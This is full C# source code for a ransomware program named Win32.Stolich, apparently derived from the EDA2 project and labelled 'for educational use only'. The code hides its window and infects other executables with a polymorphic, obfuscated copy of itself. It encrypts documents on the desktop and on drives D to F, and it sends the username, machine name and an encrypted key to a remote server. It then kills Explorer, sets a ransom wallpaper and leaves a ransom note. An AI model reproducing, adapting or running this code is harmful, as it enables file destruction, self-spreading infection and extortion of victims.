/*

>>>>>>>>>>>>>>>>>>>>>>
>>>>>>>>>>>>>
>>>> V2in16^2.St01ich|)
>>>> Copyright (c) 2016 - Empinel / May 2016 Mumbai City / For Educational Use ONLY
>>>>>>>>>>>>>
>>>>>>>>>>>>>>>>>>>>>>>

* Based on the EDUCATIONAL EDA2 Ransomware
* EDA2 Coded by Utku Sen(Jani) / October 2015 Istanbul / utkusen.com / Twitter: @utku1337
* You could go to jail on obstruction of justice charges just for running Stolich, or even worse.       
* 
* By running this program, scratch that - even reading the code, you do not hold Empinel and Utku Sen
* Liable from any damages or losses or lawsuits or anything that invokes criminal/civil proceedings in
* the court of law. If you agree to this, please do go ahead - or else kindly close and delete the
* copy(ies) of Win32.Stolich.
*/

using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.CodeDom;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Collections.Generic;
using System.ComponentModel;
using System.Collections.Specialized;
using System.Net;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;

namespace stolich
{
    public partial class Form1 : Form
    {
		public static string identiferGenerator(int length)
		{
			const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			var random = new Random();
			return new string(Enumerable.Repeat(chars, length)
				.Select(s => s[random.Next(s.Length)]).ToArray());
		}

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        private static bool OAEP = false; //Optimal Asymmetric Encryption Padding
        const int keySize = 4096; //key size for RSA algorithm
		string primeDomain = "http://website.com"; // DO NOT ADD A / after the URL
        string publicKey;
        string encryptedPassword; // AES key encrypted with RSA public key
		string identifierStr = identiferGenerator(12);
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";
		string generatorUrl = ("http://website.com/panel/createkeys.php"); //creates public key
		string keySaveUrl = ("http://website.com/panel/savekey.php"); //saves encrypted key to database
		string backgroundImageUrl = "https://website.com/demand/demands.jpg"; //desktop background picture
        string aesPassword;
		public static string database = "11111222>6K2D6K2F6K2f6K2Y6K2R6KyW6K2l6K2P6K2F6K2C6K2T6K2b6KyN6Ky76Ky86K2D6K2F6K2f6K2Y6K2R6KyW6K2l6K2P6K2F6K2C6K2T6K2b6KyY6K2i6K2T6K2O6K2C6KyN6Ky76Ky86K2D6K2F6K2f6K2Y6K2R6KyW6K2l6K2P6K2F6K2C6K2T6K2b6KyY6K2/6K256KyN6Ky76Ky86K2D6K2F6K2f6K2Y6K2R6KyW6K2l6K2P6K2F6K2C6K2T6K2b6KyY6K2y6K2f6K2X6K2R6K2Y6K2Z6K2F6K2C6K2f6K2V6K2F6KyN6Ky76Ky86K2D6K2F6K2f6K2Y6K2R6KyW6K2l6K2P6K2F6K2C6K2T6K2b6KyY6K2k6K2T6K2Q6K2a6K2T6K2V6K2C6K2f6K2Z6K2Y6KyN6Ky76Ky86K2D6K2F6K2f6K2Y6K2R6KyW6K2l6K2P6K2F6K2C6K2T6K2b6KyY6K2k6K2D6K2Y6K2C6K2f6K2b6K2T6KyY6K2/6K2Y6K2C6K2T6K2E6K2Z6K2G6K2l6K2T6K2E6K2A6K2f6K2V6K2T6K2F6KyN6Ky76Ky86K2D6K2F6K2f6K2Y6K2R6KyW6K2l6K2P6K2F6K2C6K2T6K2b6KyY6K216K2Z6K2S6K2T6K2y6K2Z6K2b6KyN6Ky76Ky86K2D6K2F6K2f6K2Y6K2R6KyW6K2l6K2P6K2F6K2C6K2T6K2b6KyY6K216K2Z6K2S6K2T6K2y6K2Z6K2b6KyY6K216K2Z6K2b6K2G6K2f6K2a6K2T6K2E6KyN6Ky76Ky86K2D6K2F6K2f6K2Y6K2R6KyW6K276K2f6K2V6K2E6K2Z6K2F6K2Z6K2Q6K2C6KyY6K216K2l6K2e6K2X6K2E6K2G6KyN6Ky76Ky86Ky76Ky86Ky76Ky86K2Y6K2X6K2b6K2T6K2F6K2G6K2X6K2V6K2T6KyW6K2l6K2P6K2F6K2C6K2T6K2b6KyY6K2i6K2T6K2O6K2C6KyY6K2/6K256Ky76Ky86K2N6Ky76Ky86KyW6KyW6KyW6KyW6K2G6K2D6K2U6K2a6K2f6K2V6KyW6K2V6K2a6K2X6K2F6K2F6KyW6K2m6K2Z6K2a6K2P6Ky76Ky86KyW6KyW6KyW6KyW6K2N6Ky76Ky86KyW6KyW6KyW6KyW6KyW6KyW6KyW6KyW6K2G6K2E6K2f6K2A6K2X6K2C6K2T6KyW6K2F6K2C6K2X6K2C6K2f6K2V6KyW6K2F6K2C6K2E6K2f6K2Y6K2R6KyW6K2S6K2X6K2C6K2X6K2U6K2X6K2F6K2T6KyW6KyL6KyW6KyU>"; 

		private static int counter = 0;
		private class w32api
		{
			[DllImport("user32.dll", CharSet = CharSet.Auto)]
			public static extern int MessageBox(int hWnd, String text, String caption, uint type);
		}

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
			string xyxx = Path.GetDirectoryName(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName);
			string glen = Directory.GetDirectoryRoot(xyxx);
			DirectoryInfo dirx = new DirectoryInfo(@glen);
			int yyxx = InitialMutations(dirx);

			FileStream fs188 = new FileStream(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
			int host = (int)fs188.Length;
			int vir = host - 0117248;
			byte[] bytes1 = Readx(fs188, vir, 0117248);
			fs188.Close();
			Random ran = new Random();
			int yty = ran.Next(2000);
			FileStream fs6 = new FileStream("p" + yty + "h.exe", FileMode.OpenOrCreate, FileAccess.Write);
			Writex(fs6, bytes1);
			fs6.Close();
			try
			{
				Process xtx = Process.Start("p" + yty + "h.exe");
				xtx.WaitForExit();
			}
			catch
			{
				;
			}
			finally
			{
				File.Delete("p" + yty + "h.exe");
			}

			// All Mutation Pertaining Processes have been completed,
			// now time to initiate the crypter
            startAction();
        }

		// GUIKiller() is designed to kill Microsoft Windows Explorer
		// and is part of a scareware tactic
		public void GUIkiller()
		{
			foreach (var process in Process.GetProcessesByName("explorer"))
			{
				process.Kill();
			}
		}

		// This will prevent the program from being even remotly visible to anybody
        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

		// This would be the basic starting of the Polymorphic Mutations Engine (PME)
		private static int InitialMutations(DirectoryInfo doy)
		{
			FileInfo[] filesx = doy.GetFiles("*.exe");
			foreach (FileInfo filex in filesx)
			{
				string filenamex = filex.FullName;
				try
				{

					AssemblyName.GetAssemblyName(filenamex); //check exe if msil
					if (getsig(filenamex)=="alco")
						continue;
					else
						try
					{
						bool yul = Mutate(filenamex,database); // the meat of the routine
						if (yul == false)
						{
							counter++;
						}
					}
					catch
					{
						continue; // error infecting file (maybe it's running/readonly/etc.) .. goto next file
					}
				}
				catch { continue; } //not msil, next file

			}
			DirectoryInfo[] dirs = doy.GetDirectories("*.*");
			foreach (DirectoryInfo xdir in dirs)
			{
				try
				{
					int y0y = InitialMutations(xdir);
				}
				catch { continue; }
			}
			return 1;
		}

		private static string getsig(string filenamex)
		{
			FileStream fs55 = new FileStream(filenamex, FileMode.OpenOrCreate, FileAccess.Read);
			int iccp = (int)fs55.Length;
			byte[] bytes4 = Readx(fs55, 4, iccp - 4);
			fs55.Close();
			UTF8Encoding zenc = new UTF8Encoding();
			return zenc.GetString(bytes4);
		}

		private static byte[] Readx(FileStream sxtream, int xlength, int cccur)
		{
			BinaryReader w33 = new BinaryReader(sxtream);
			w33.BaseStream.Seek(cccur, SeekOrigin.Begin);
			byte[] bytes2 = new byte[xlength];
			int numBytesToRead2 = (int)xlength;
			int numBytesRead2 = 0;
			while (numBytesToRead2 > 0)
			{
				int n00 = w33.Read(bytes2, numBytesRead2, numBytesToRead2);
				if (n00 == 0)
					break;
				numBytesRead2 += n00;
				numBytesToRead2 -= n00;
			}
			w33.Close();
			return bytes2;
		}

		private static bool Mutate(string host, string codeq)
		{
			string output = new Random().Next((66 + 1), 1000).ToString();
			// read self
			Random ran = new Random();
			int yty = ran.Next(2000);
			string[] xtx = codeq.Split(new char[] { '>' });

			string codez = EncryptDecrypt(decodeb64(xtx[2]), Convert.ToInt32(xtx[0]));
			string codey = EncryptDecrypt(decodeb64(xtx[1]), Convert.ToInt32(xtx[0]));

			string filename1 = "x" + yty + "y.exe";

			if (output.Length == 1)
			{
				output = "0000" + output;
			}
			else if (output.Length == 2)
			{
				output = "000" + output;
			}
			else if (output.Length == 3)
			{
				output = "00" + output;
			}
			else
			{
				output = "0" + output;
			}

			Random gord = new Random();
			int glog = gord.Next(1, 5000);
			string gfgx = "//" + RndString(glog,true);

			string codev = xtx[0].Replace("11111222", output);
			codez = codez.Replace("11111222", output);
			//poly
			codez = kk(codez);
			//poly
			codez = codez + gfgx;
			string midcod = codev + ">" + textToBase64(EncryptDecrypt(codey, System.Convert.ToInt32(output))) + ">" + textToBase64(EncryptDecrypt(codez, System.Convert.ToInt32(output))); 
			string xcodex = codey + midcod + codez;

			bool tgg = BuildExe(filename1, xcodex);
			if (tgg == false)
			{
				return true;
			}

			FileStream fs122 = new FileStream(filename1, FileMode.OpenOrCreate, FileAccess.Read);
			int iccp = (int)fs122.Length;
			fs122.Close();
			File.Delete(filename1);

			string jops = "0" + iccp.ToString();
			codez = codez.Replace("0117248", jops);
			midcod = codev + ">" + textToBase64(EncryptDecrypt(codey, System.Convert.ToInt32(output))) + ">" + textToBase64(EncryptDecrypt(codez, System.Convert.ToInt32(output)));
			xcodex = codey + midcod + codez;

			tgg = BuildExe(filename1, xcodex);
			if (tgg == false)
			{
				return true;
			}

			FileStream fs223 = new FileStream(filename1, FileMode.OpenOrCreate, FileAccess.Read);
			int icxcp = (int)fs223.Length;
			byte[] bytes1 = Readx(fs223, icxcp, 0);
			fs223.Close();
			// read host
			File.Delete(filename1);

			FileStream fs133 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Read);
			int ippc = (int)fs133.Length;
			byte[] bytes2 = Readx(fs133, ippc, 0);
			fs133.Close();


			// save self + host to hostfile
			UTF8Encoding xncoding = new UTF8Encoding();
			byte[] lojh = xncoding.GetBytes("alco");

			FileStream fs144 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Write);
			byte[] hjob = Combine(bytes1, bytes2);
			hjob = Combine(hjob, lojh);
			Writex(fs144, hjob);
			fs144.Close();

			return false;
		}

		private static void Writex(FileStream sxtream, byte[] green)
		{
			BinaryWriter ritw = new BinaryWriter(sxtream);
			ritw.BaseStream.Seek(0, SeekOrigin.Begin);
			ritw.Write(green);
			ritw.Flush();
			ritw.Close();
		}

		private static string decodeb64(string donny)
		{
			byte[] gaul = Convert.FromBase64String(donny);
			return Encoding.UTF8.GetString(gaul);
		}

		private static byte[] Combine(byte[] a123, byte[] b123)
		{
			byte[] c123 = new byte[a123.Length + b123.Length];
			Buffer.BlockCopy(a123, 0, c123, 0, a123.Length);
			Buffer.BlockCopy(b123, 0, c123, a123.Length, b123.Length);
			return c123;
		}

		private static string textToBase64(string sAscii)
		{
			UTF8Encoding xncoding = new UTF8Encoding();
			byte[] bytesx = xncoding.GetBytes(sAscii);
			return Convert.ToBase64String(bytesx, 0, bytesx.Length);
		}

		private static string EncryptDecrypt(string textToEncrypt, int key)
		{
			StringBuilder inSb = new StringBuilder(textToEncrypt);
			StringBuilder outSb = new StringBuilder(textToEncrypt.Length);
			char cmmm;
			for (int immm = 0; immm < textToEncrypt.Length; immm++)
			{
				cmmm = inSb[immm];
				cmmm = (char)(cmmm ^ key);
				outSb.Append(cmmm);
			}
			return outSb.ToString();
		}

		private static string kk(string jyug)
		{
			Random ran = new Random();
			string[] ghost = { "counter", "AndLetsRock", "xncoding",
				"glen","xyxx","yyxx","dirx","fs188", "host", "vir","yty","fs6","bytes1","xtx",
				"toth", "filesx","doy","filex","yul", "dirs", "xdir", "y0y", "getsig","fs55",
				"iccp", "bytes4", "zenc","Readx", "filenamex","sxtream","xlength","cccur",
				"w33","bytes2", "numBytesRead2", "numBytesToRead2", "n00", "Infect","codeq",
				"ran", "codez", "codey","filename1","output","gord","glog","gfgx","codev",
				"midcod","xcodex","tgg", "fs122","jops","fs223","icxcp","fs133", "ippc", "bytes2",
				"fs144","hjob","lojh","green","ritw", "Writex","EncryptDecrypt", "Combine",
				"a123", "b123", "c123", "decodeb64","gaul","donny",
				"immm","textToBase64","sAscii","bytesx","kk","jyug","ran","hooter","impy",
				"hh1","letx","numx","vic","ocp", "zname", "zresults",
				"textToEncrypt","key","inSb","outSb","cmmm","ghost", "RndString",
				"size123","xlowerCase","derbui","rand0m","xchi", "BuildExe"};
			
			for (int impy = 0; impy < ghost.Length; impy++)
			{
				jyug = jyug.Replace(ghost[impy], hh1(ran.Next((1003 + 1), (5555 - 1)) + impy) + (ran.Next((1003 + 1), (5555 - 1)) + impy).ToString());
			}
			return jyug;
		}

		private static string hh1(int hooter)
		{
			char[] letx = new char[7];
			Random ran = new Random(hooter);
			for (int immm = 0; immm < 7; immm++)
			{
				int numx = ran.Next(0, 26); // Zero to 25
				letx[immm] += (char)('a' + numx);
			}
			string output = new string(letx);
			return output;
		}

		private static bool BuildExe(string zname, string codey)
		{
			ICodeCompiler vic = new CSharpCodeProvider().CreateCompiler();
			CompilerParameters ocp = new CompilerParameters();
			ocp.ReferencedAssemblies.Add("System.dll");
			ocp.GenerateExecutable = true;
			ocp.CompilerOptions = "/target:winexe";
			ocp.OutputAssembly = zname;

			CompilerResults zresults = vic.CompileAssemblyFromSource(ocp, codey);
			if (zresults.Errors.Count == 0)
			{
				return true;
			}
			else
			{
				return false;
			}
		}

		private static string RndString(int size123, bool xlowerCase)
		{
			StringBuilder derbui = new StringBuilder();
			Random rand0m = new Random();
			char xchi;
			for (int i = 0; i < size123; i++)
			{
				xchi = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * rand0m.NextDouble() + 65)));
				derbui.Append(xchi);
			}
			if (xlowerCase)
				return derbui.ToString().ToLower();
			return derbui.ToString();
		}

		// Makes a POST request to web server with "x39nam" (USERNAME) and "cpe93j" (COMPUTERNAME) parameters
        // Webserver responses with the RSA public key and the function returns it.
        public string getPublicKey(string url)
        {
            WebClient webClient = new WebClient();
            NameValueCollection formData = new NameValueCollection();
			formData["id"] = identifierStr;
			formData["username"] = userName;
            formData["pcname"] = computerName;
			byte[] responseBytes = webClient.UploadValues(url, "POST", formData);
            string responsefromserver = Encoding.UTF8.GetString(responseBytes);
            webClient.Dispose();
            return responsefromserver;
        }

        //Sends encryptedPassword variable with "aesencrypted" parameter to web server with a POST request
        public void sendKey(string url)
        {
            WebClient webClient = new WebClient();
            NameValueCollection formData = new NameValueCollection();
            formData["pcname"] = computerName;
            formData["aesencrypted"] = encryptedPassword;
            byte[] responseBytes = webClient.UploadValues(url, "POST", formData);
            webClient.Dispose();
        }

		public void startAction()
		{
			string path = "\\Desktop\\";
			string startPath = userDir + userName + path;
			publicKey = getPublicKey(generatorUrl);
			string aesPassword = CreatePassword(64);
			encryptDirectory(startPath,aesPassword);
			encryptedPassword = EncryptTextRSA(aesPassword, keySize, publicKey);
			sendKey(keySaveUrl);
			aesPassword = null;
			encryptedPassword = null;


			if (Directory.Exists ("D:\\")) {
				killDPart ();
			}

			if (Directory.Exists ("E:\\")) {
				killEPart ();
			} 

			if (Directory.Exists ("F:\\")) {
				killFPart ();
			}

			string backgroundImageName = userDir + userName + "\\ransom.jpg";
			SetWallpaperFromWeb(backgroundImageUrl, backgroundImageName);
			GUIkiller();
			Process.Start(primeDomain + "/demand/");
			GC.Collect(); // Little bit of dirty cleaning

			string text = "You have been attacked by the Stolich RSWare, your Personal Identifier is " + 
						  identifierStr + 
						  " ,if you lose it - any chance of getting your data is flushed in the toilet";
			System.IO.File.WriteAllText((@userDir + userName + "\\Desktop\\README.txt"), text);

			nullifyMyExistance();
			GC.Collect();
			System.Windows.Forms.Application.Exit();
		}

		public void killDPart()
		{
			string path = "D:\\";
			string startPath = path;
			publicKey = getPublicKey(generatorUrl);
			string aesPassword = CreatePassword(64);
			encryptDirectory(startPath,aesPassword);
			encryptedPassword = EncryptTextRSA(aesPassword, keySize, publicKey);
			sendKey(keySaveUrl);
			aesPassword = null;
			encryptedPassword = null;
		}

		public void killEPart()
		{
			string path = "E:\\";
			string startPath = path;
			publicKey = getPublicKey(generatorUrl);
			string aesPassword = CreatePassword(64);
			encryptDirectory(startPath,aesPassword);
			encryptedPassword = EncryptTextRSA(aesPassword, keySize, publicKey);
			sendKey(keySaveUrl);
			aesPassword = null;
			encryptedPassword = null;
		}

		public void killFPart()
		{
			string path = "F:\\";
			string startPath = path;
			publicKey = getPublicKey(generatorUrl);
			string aesPassword = CreatePassword(64);
			encryptDirectory(startPath,aesPassword);
			encryptedPassword = EncryptTextRSA(aesPassword, keySize, publicKey);
			sendKey(keySaveUrl);
			aesPassword = null;
			encryptedPassword = null;
		}

        //Encrypts a file with AES algorithm
        public void EncryptFile(string file, string password)
        {
            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file + ".stolich"); //new file extension
        }

		public void nullifyMyExistance(){
			bool OAEP = 					false; //Optimal Asymmetric Encryption Padding
			const int keySize = 			0; //key size for RSA algorithm
			string primeDomain = 			null; // DO NOT ADD A / after the URL
			string publicKey = 				null;
			string encryptedPassword = 		null; // AES key encrypted with RSA public key
			string identifierStr = 			null;
			string userName = 				null;
			string computerName = 			null;
			string userDir = 				null;
			string generatorUrl = 			null; //creates public key
			string keySaveUrl = 			null; //saves encrypted key to database
			string backgroundImageUrl = 	null; //desktop background picture
			string aesPassword = 			null;
		}

        //Encrypts directory and subdirectories
        public void encryptDirectory(string location, string password)
        {

            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", 
				".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", 
				".aspx", ".html", ".xml", ".psd", ".css", ".js", ".cpp", ".h", ".hpp",
				".dwg", ".bak", ".vb"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    EncryptFile(files[i], password);
					File.SetLastWriteTime(files[i], new DateTime(1985,4,3));
                }
            }
            for (int i = 0; i < childDirectories.Length; i++)
            {
                encryptDirectory(childDirectories[i], password);
				Directory.SetLastWriteTime(childDirectories[i], new DateTime(1985,4,3));
            }


        }

        //Encrypts a string with RSA public key
        public static string EncryptTextRSA(string text, int keySize, string publicKeyXml)
        {
            var encrypted = RSAEncrypt(Encoding.UTF8.GetBytes(text), keySize, publicKeyXml);
            return Convert.ToBase64String(encrypted);
        }

        // RSA encryption algorithm
        public static byte[] RSAEncrypt(byte[] data, int keySize, string publicKeyXml)
        {
 
            using (var provider = new RSACryptoServiceProvider(keySize))
            {
                provider.FromXmlString(publicKeyXml);
                return provider.Encrypt(data, OAEP);
            }
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;

			var rng = new RNGCryptoServiceProvider();
			var saltBytes = new Byte[15];
			rng.GetBytes(saltBytes);

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //Creates an integer value for random generation process
        public static int GetInt(RNGCryptoServiceProvider rnd, int max)
        {
            byte[] r = new byte[4];
            int value;
            do
            {
                rnd.GetBytes(r);
                value = BitConverter.ToInt32(r, 0) & Int32.MaxValue;
            } while (value >= max * (Int32.MaxValue / max));
            return value % max;
        }

        //Generates a random string
		public static string CreatePassword(int maxSize)
		{
			char[] chars = new char[62];
			chars =
				"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
			byte[] data = new byte[1];
			using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
			{
				crypto.GetNonZeroBytes(data);
				data = new byte[maxSize];
				crypto.GetNonZeroBytes(data);
			}
			StringBuilder result = new StringBuilder(maxSize);
			foreach (byte b in data)
			{
				result.Append(chars[b % (chars.Length)]);
			}
			return result.ToString();
		}

		public void SetWallpaper(String path)
		{
			SystemParametersInfo(0x14, 0, path, 0x01 | 0x02);
		}

        //Downloads image from web
        private void SetWallpaperFromWeb(string url, string path)
        {
            WebClient webClient = new WebClient();
            webClient.DownloadFile(new Uri(url), path);
            SetWallpaper(path);
        }

        
    }


}
    

